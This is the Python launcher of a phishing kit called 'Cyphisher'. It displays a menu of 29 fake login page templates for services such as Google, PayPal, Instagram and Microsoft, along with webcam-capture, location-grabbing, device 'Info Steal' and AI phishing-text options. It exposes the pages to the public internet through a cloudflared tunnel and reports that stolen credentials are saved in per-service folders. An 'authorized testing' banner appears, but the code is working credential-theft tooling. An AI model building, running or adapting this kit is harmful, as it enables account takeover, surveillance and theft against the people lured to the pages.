import random
import sys
from rich.panel import Panel
from rich.align import Align
from rich.columns import Columns
from rich.box import ROUNDED
import pyfiglet
import math
import subprocess
import time
import re
import os
from rich.console import Console

console = Console()
BASE_DIR = os.path.dirname(os.path.abspath(__file__))


def Banner():
    console = Console()
    os.system('cls' if os.name == 'nt' else 'clear')

    ascii_logo = pyfiglet.figlet_format("Cyphisher", font="slant")
    console.print(Align(ascii_logo, align="center"), style="bold green")

    welcome_panel = Panel(
        "[bold magenta]Advanced Phishing Framework[/bold magenta]\n[italic cyan]For Educational & Authorized Testing Only[/italic cyan]",
        title="[bold yellow]Welcome to Cyphisher[/bold yellow]",
        border_style="bright_blue",
        box=ROUNDED,
        padding=(1, 2)
    )
    console.print(Align(welcome_panel, align="center"))

    with console.status("[bold green]Loading modules..."):
        time.sleep(1.2)
        time.sleep(0.6)

    console.print("\n[bold green]✓ Ready to run![/bold green]\n")
    time.sleep(4)

    lists_ = [
        "[1] Steam", "[2] Instagram", "[3] Location", "[4] Webcam Capture",
        "[5] IG Followers", "[6] Facebook", "[7] Github",
        "[8] Google", "[9] WordPress", "[10] Django Admin", "[11] Netflix",
        "[12] Discord", "[13] Paypal", "[14] Twitter",
        "[15] Yahoo", "[16] Yandex", "[17] Snapchat", "[18] Roblox",
        "[19] Adobe", "[20] LinkedIn",
        "[21] Gitlab", "[22] ebay", "[23] Dropbox", "[24] ChatGPT",
        "[25] DeepSeek", "[26] Info Steal", "[27] Phone Number", "[28] Twitch",
        "[29] Microsoft"
    ]

    special_options = [
        "[30] About",
        "[31] Phishing Content Generator ( AI )",
        "[32] Exit"
    ]

    console.print("[bold underline yellow]Available Templates:[/bold underline yellow]\n")

    term_width = console.size.width or 80
    reserved = 8
    min_panel = 18
    max_panel = 40

    panel_width = (term_width - reserved) // 3
    panel_width = max(min_panel, min(max_panel, panel_width))

    if panel_width < min_panel:
        console.print(
            "[bold red]Terminal too narrow — increase terminal width to show 3 columns side-by-side.[/bold red]\n")

    n = len(lists_)
    chunks_count = 3
    chunk_size = math.ceil(n / chunks_count)
    chunks = [lists_[i:i + chunk_size] for i in range(0, n, chunk_size)]
    while len(chunks) < 3:
        chunks.append([])

    column_panels = []
    for i, chunk in enumerate(chunks[:3]):
        col_items = []
        for item in chunk:
            if any(x in item for x in ["Instagram", "Facebook", "Twitter"]):
                col_items.append(f"[cyan]{item}[/cyan]")
            elif any(x in item for x in ["Paypal", "Google", "Yahoo"]):
                col_items.append(f"[green]{item}[/green]")
            elif any(x in item for x in ["Steam", "XBOX", "Twitch"]):
                col_items.append(f"[magenta]{item}[/magenta]")
            else:
                col_items.append(f"[white]{item}[/white]")

        col_text = "\n".join(col_items) if col_items else " "
        panel = Panel(col_text, box=ROUNDED, border_style="blue", width=panel_width,
                      title=f"[bold]Group {i + 1}[/bold]")
        column_panels.append(panel)

    console.print(Columns(column_panels, equal=True, expand=False))

    special_panels = []
    for option in special_options:
        if "AI" in option:
            panel = Panel(option, border_style="magenta", box=ROUNDED, width=36, padding=(0, 1))
        elif "About" in option:
            panel = Panel(option, border_style="cyan", box=ROUNDED, width=28, padding=(0, 1))
        elif "Exit" in option:
            panel = Panel(option, border_style="red", box=ROUNDED, width=20, padding=(0, 1))
        else:
            panel = Panel(option, border_style="yellow", box=ROUNDED, width=28, padding=(0, 1))
        special_panels.append(panel)

    console.print("\n")
    console.print(Align(Columns(special_panels, equal=False, expand=False), align="center"))
    console.print("\n")


def extract_cloudflare_url(text):
    pattern = r'https://[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)?\.trycloudflare\.com'
    match = re.search(pattern, text)
    if match:
        return match.group(0)
    return None


def get_cloudflare_url():
    possible_paths = [
        os.path.join(BASE_DIR, "cloud_flare", "cloudflared"),
        os.path.join(BASE_DIR, "cloud_flare", "cloudflared.exe"),
        os.path.join(BASE_DIR, "cloudflared"),
        os.path.join(BASE_DIR, "cloudflared.exe"),
        "cloudflared"
    ]

    cloudflared_path = None
    for path in possible_paths:
        if os.path.exists(path):
            cloudflared_path = path
            break
        elif path == "cloudflared":
            try:
                if os.name == 'nt':
                    result = subprocess.run(["where", "cloudflared"], capture_output=True, text=True, timeout=5)
                else:
                    result = subprocess.run(["which", "cloudflared"], capture_output=True, text=True, timeout=5)

                if result.returncode == 0:
                    cloudflared_path = "cloudflared"
                    break
            except:
                pass

    if not cloudflared_path:
        console.print("[red]cloudflared not found![/red]")
        return None

    try:
        if os.name == 'nt':
            process = subprocess.Popen(
                [cloudflared_path, "tunnel", "--url", "http://localhost:5001"],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        else:
            process = subprocess.Popen(
                [cloudflared_path, "tunnel", "--url", "http://localhost:5001"],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )

        console.print("[yellow]⏳ Starting Cloudflare tunnel...[/yellow]")
        cloudflare_url = None
        timeout = time.time() + 20

        while time.time() < timeout:
            line = process.stdout.readline()
            if not line:
                time.sleep(0.5)
                continue
            cloudflare_url = extract_cloudflare_url(line)
            if cloudflare_url:
                break

        if cloudflare_url:
            console.print(f"[green]✓ Cloudflare URL: {cloudflare_url}[/green]")
            return cloudflare_url
        else:
            console.print("[red]⚠ Could not extract Cloudflare URL[/red]")
            return None

    except Exception as e:
        console.print(f"[red]Error starting Cloudflare: {e}[/red]")
        return None


def Choice():
    try:
        user_choice = int(input("Select an option (1-32): "))
    except ValueError:
        console.print("[red]Please enter a valid number[/red]")
        return

    cloudflare_url = get_cloudflare_url() or "https://your-tunnel.trycloudflare.com"

    if user_choice == 1:
        console.print(f"\n[+] Your Steam Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ Steam_Credentials ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import steam
        steam.run()



    elif user_choice == 2:
        console.print(f"\n[+] Your Instagram Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ insta_Credentials ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import instagram
        instagram.run()



    elif user_choice == 3:
        console.print(f"\n[+] Your Location Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ location_information ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import location
        location.run()



    elif user_choice == 4:
        console.print(f"\n[+] Your WebCam Capture Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ uploads ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import take_picture
        take_picture.run()


    elif user_choice == 5:
        console.print(f"\n[+] Your IG Follower Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ IG_FOLLOWER ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import IG_Follower
        IG_Follower.run()


    elif user_choice == 6:
        console.print(f"\n[+] Your FaceBook Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ Facebook ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import facebook
        facebook.run()

    elif user_choice == 7:
        console.print(f"\n[+] Your Github Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ Github ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import github
        github.run()


    elif user_choice == 8:
        console.print(f"\n[+] Your Google Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ Google ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import Google
        Google.run()


    elif user_choice == 9:
        console.print(f"\n[+] Your WordPress Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ WordPress ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import wordpress
        wordpress.run()


    elif user_choice == 10:
        console.print(f"\n[+] Your Django Admin Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ Django ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import django_admin
        django_admin.run()


    elif user_choice == 11:
        console.print(f"\n[+] Your Netflix Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ Netflix ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import netflix
        netflix.run()


    elif user_choice == 12:
        console.print(f"\n[+] Your Discord Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ Discord ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import discord
        discord.run()


    elif user_choice == 13:
        console.print(f"\n[+] Your Paypal Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ Paypal ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import paypal
        paypal.run()


    elif user_choice == 14:
        console.print(f"\n[+] Your X Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ Twitter ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import twitter
        twitter.run()


    elif user_choice == 15:
        console.print(f"\n[+] Your Yahoo Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ Yahoo ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import yahoo
        yahoo.run()


    elif user_choice == 16:
        console.print(f"\n[+] Your Yandex Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ yandex ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import yandex
        yandex.run()


    elif user_choice == 17:
        console.print(f"\n[+] Your SnapChat Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ snapchat ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import snapchat
        snapchat.run()


    elif user_choice == 18:
        console.print(f"\n[+] Your Roblox Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ Roblox ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import roblox
        roblox.run()


    elif user_choice == 19:
        console.print(f"\n[+] Your Adobe Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ adobe ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import adobe
        adobe.run()


    elif user_choice == 20:
        console.print(f"\n[+] Your LinkedIN Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ LinkedIN ] 👈 Directory.\n")
        from Pages import linkedin
        linkedin.run()


    elif user_choice == 21:
        console.print(f"\n[+] Your Gitlab Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ Gitlab ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import Gitlab
        Gitlab.run()


    elif user_choice == 22:
        console.print(f"\n[+] Your Ebay Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ Ebay ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import ebay
        ebay.run()


    elif user_choice == 23:
        console.print(f"\n[+] Your Dropbox Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ Dropbox ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import drop_box
        drop_box.run()

    elif user_choice == 24:
        console.print(f"\n[+] Your chatgpt Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ chatgpt ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import chatgpt_
        chatgpt_.run()

    elif user_choice == 25:
        console.print(f"\n[+] Your Deepseek Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ Deepseek ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import deepseek
        deepseek.run()

    elif user_choice == 26:
        console.print(f"\n[+] Your information_Stealer Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ collected_data/all_devices.json ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import Target_information
        Target_information.run()

    elif user_choice == 27:
        console.print(f"\n[+] Your Phone Number Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ phone_data ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import Target_information
        Target_information.run()


    elif user_choice == 28:
        console.print(f"\n[+] Your Twitch Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ Twitch ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")

        from Pages import twitch
        twitch.run()


    elif user_choice == 29:
        console.print(f"\n[+] Your Microsoft Page Cloudflare Link 👇 {cloudflare_url}")
        console.print("[+] Credentials Will be Saved in 👉 [ Microsoft ] 👈 Directory.\n")
        console.print("[+] Press CTRL + C to Stop The Code .\n")
        from Pages import microsoft
        microsoft.run()


    elif user_choice == 30:
        console.print(f"\n[+] About Us ...")
        from ABOUT import About
        About.run()


    elif user_choice == 31:
        console.print(f"\n[+] Our Basic AI Content Creator You can Use other Platform for a better chance ! ...")
        from AI import Test
        Test.main_interactive()

    elif user_choice == 32:
        console.print(f"\n[+] Existing ... ! ...")
        sys.exit()


if __name__ == "__main__":
    while True:
        Banner()
        time.sleep(random.randint(2, 4))
        Choice()
        time.sleep(3)
        console.print("You Want to Continue? (y/n):")
        user_ = input("y/n: ")
        if user_.lower() == "n":
            sys.exit()
